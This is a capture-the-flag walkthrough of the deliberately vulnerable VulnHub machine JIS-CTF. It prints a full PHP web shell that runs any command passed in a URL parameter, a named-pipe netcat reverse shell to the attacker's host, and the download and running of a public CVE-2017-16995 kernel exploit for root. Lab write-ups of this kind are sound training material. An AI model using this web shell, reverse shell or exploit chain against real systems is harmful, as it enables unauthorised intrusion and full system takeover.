
# JIS - Jordan InfoSec

Available on VulnHub: https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.135   08:00:27:7b:38:93      1      xx  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.135
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-07 10:00 EST
Nmap scan report for 192.168.1.135
Host is up (0.020s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 af:b9:68:38:77:7c:40:f6:bf:98:09:ff:d9:5f:73:ec (RSA)
|   256 b9:df:60:1e:6d:6f:d7:f6:24:fd:ae:f8:e3:cf:16:ac (ECDSA)
|_  256 78:5a:95:bb:d5:bf:ad:cf:b2:f5:0f:c0:0c:af:f7:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 8 disallowed entries 
| / /backup /admin /admin_area /r00t /uploads 
|_/uploaded_files /flag
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Sign-Up/Login Form
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.81 seconds
```

### Web Analysis

```
$ nikto -h http://192.168.1.135

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.135
+ Target Hostname:    192.168.1.135
+ Target Port:        80
+ Start Time:         2020-11-07 10:03:45 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ Root page / redirects to: login.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin_area/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/uploaded_files/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/flag/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 8 entries which should be manually viewed.
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7924 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2020-11-07 10:04:59 (GMT-5) (74 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ dirb http://192.168.1.135

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Nov  7 10:03:56 2020
URL_BASE: http://192.168.1.135/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.135/ ----
==> DIRECTORY: http://192.168.1.135/admin_area/                                                                      
==> DIRECTORY: http://192.168.1.135/assets/                                                                          
==> DIRECTORY: http://192.168.1.135/css/                                                                             
==> DIRECTORY: http://192.168.1.135/flag/                                                                            
+ http://192.168.1.135/index.php (CODE:302|SIZE:1228)                                                                
==> DIRECTORY: http://192.168.1.135/js/                                                                              
+ http://192.168.1.135/robots.txt (CODE:200|SIZE:160)                                                                
+ http://192.168.1.135/server-status (CODE:403|SIZE:301)                                                             
                                                                                                                     
---- Entering directory: http://192.168.1.135/admin_area/ ----
+ http://192.168.1.135/admin_area/index.php (CODE:200|SIZE:224)                                                      
                                                                                                                     
---- Entering directory: http://192.168.1.135/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.135/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.135/flag/ ----
+ http://192.168.1.135/flag/index.html (CODE:200|SIZE:109)                                                           
                                                                                                                     
---- Entering directory: http://192.168.1.135/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Nov  7 10:04:35 2020
DOWNLOADED: 13836 - FOUND: 5
```

### Flag #1

HTTP GET on `http://192.168.1.135/flag/`

```
The 1st flag is : {8734509128730458630012095}
```

### Flag #2

Page source code of `http://192.168.1.135/admin_area/`

```
<html>
<head>
<title>
Fake admin area :)
</title>
<body>
<center><h1>The admin area not work :) </h1></center>
<!--	username : admin
	password : 3v1l_H@ck3r
	The 2nd flag is : {7412574125871236547895214}
-->
</body>
</html>
```

Flag: **7412574125871236547895214** \
User: **admin** \
Pass: **3v1l_H@ck3r**

### WEB Page Login

Login into `http://192.168.1.135/login.php` page with previously retrieved credentials we found an file uploader page.

### Uploading File Understanding

I created and updated the `index.php` file to run system commands through PHP:
```
<?php
if ($_GET['run']) {
  $result = exec("uname -a");
  print($result);
}
?>

<a href="?run=true">RUN IT NOW!</a>
```

I called `index.php` with `http://192.168.1.135/uploaded_files/index.php` and I got an **RCE** (Remote Code Execution):
```
RUN IT NOW!
Linux Jordaninfosec-CTF01 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

### PHP WEB Shell

To better interact with this RCE I uploaded the `php_web_shell.php` file.\
It is an PHP WEB Shell based on `https://github.com/andripwn/rce`.\
\
`php_web_shell.php` (the raw file is in this repository)
```
<title>PHP Web Shell</title>
<html>
<body>

    <form id="execute_form" autocomplete="off">
        <b>Command</b><input type="text" name="id" id="id" autofocus="autofocus" style="width: 600px" />
        <input type="submit" value="Execute" />
    </form>

    <!-- PHP code that executes command and outputs cleanly -->
    <?php
        $command = $_GET['id'];
        echo "<b>Executed:</b>  $command";
        echo str_repeat("<br>",2);
        echo "<b>Output:</b>";
        echo str_repeat("<br>",2);
        exec($command . " 2>&1", $output, $return_status);
        if (isset($return_status)):
            if ($return_status !== 0):
                echo "<font color='red'>Error in Code Execution -->  </font>";
                foreach ($output as &$line) {
                    echo "$line <br>";
                };
            elseif ($return_status == 0 && empty($output)):
                echo "<font color='green'>Command ran successfully, but does not have any output.</font>";
            else:
                foreach ($output as &$line) {
                    echo "$line <br>";
                };
            endif;
        endif;
    ?>
</body>
</html>
```

### Remote Shell

First I attempt to use `netcat` to get a reverse shell, but target's `netcat` doesn't have `-e` option.
```
nc: invalid option -- 'e'
This is nc from the netcat-openbsd package. An alternative nc is available
in the netcat-traditional package.
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
[-P proxy_username] [-p source_port] [-q seconds] [-s source]
[-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
[-x proxy_address[:port]] [destination] [port]
```

So I ran `netcat` using file descriptor mechanism to get remote shell connection.\
\
Listening `4444` port on my host
```
$ nc -lvp 4444
listening on [any] 4444 ...
```

Running bind connection on target through PHP WEB Shell
```
$ mknod /tmp/backpipe p
$ /bin/sh 0</tmp/backpipe | nc 192.168.1.116 4444 1>/tmp/backpipe
```

Now we have the target reverse shell
```
192.168.1.135: inverse host lookup failed: Unknown host
connect to [192.168.1.116] from (UNKNOWN) [192.168.1.135] 34182

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Privilege Escalation Analysis

Spawning bash
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@Jordaninfosec-CTF01:/var/www/html/uploaded_files$
```

Running Linux Exploit Suggester - LES ( https://github.com/mzet-/linux-exploit-suggester )
```
www-data@Jordaninfosec-CTF01:/tmp$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
www-data@Jordaninfosec-CTF01:/tmp$ chmod +x les.sh
www-data@Jordaninfosec-CTF01:/tmp$ ./les.sh

Available information:

Kernel version: 4.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 16.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

74 kernel space exploits
45 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working
```

### Exploitation

I will attempt to explore the CVE-2017-16995 vulnerability ( https://www.exploit-db.com/exploits/45010 )\
For that I download and compile the exploit locally.
```
$ wget https://www.exploit-db.com/raw/45010
$ mv 45010 cve-2017-16995.c
$ gcc cve-2017-16995.c -o cve-2017-16995.o
```

Now I uploaded the binary file using WEB uploader page and run it on target with my remote shell.
```
www-data@Jordaninfosec-CTF01:/tmp$ cp /var/www/html/uploaded_files/cve-2017-16995.o /tmp/
www-data@Jordaninfosec-CTF01:/tmp$ chmod +x cve-2017-16995.o
www-data@Jordaninfosec-CTF01:/tmp$ ./cve-2017-16995.o

[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff8800d73f0000
[*] Leaking sock struct from ffff8800d68cb000
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88011a51ab40
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff88011a51ab40
[*] credentials patched, launching shell...
#
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

### Flags Acquiring

To find where is the other flags, I search in `.bash_history` file.
```
# cat /home/technawi/.bash_history

.
..
...
sudo touch flag.txt
sudo vi flag.txt
...
sudo chown root:technawi flag.txt
sudo chmod 640 flag.txt
...
sudo touch credentials.txt
sudo chown technawi:technawi credentials.txt 
sudo chmod 640 credentials.txt
sudo mv credentials.txt mysql/
...
sudo vi hint.txt
sudo chown www-data:www-data hint.txt
...
..
.
```

### Flag #3

```
# find . | grep hint.txt
# cat ./var/www/html/hint.txt

try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)
The 3rd flag is : {7645110034526579012345670}
```

### Flag #4

```
# find . | grep credentials.txt
# cat ./etc/mysql/conf.d/credentials.txt

The 4th flag is : {7845658974123568974185412}
username : technawi
password : 3vilH@ksor
```

User: **technawi** \
Pass: **3vilH@ksor**

### Flag #5

```
# find . | grep flag.txt
# cat ./var/www/html/flag.txt

The 5th flag is : {5473215946785213456975249}
Good job :)
```
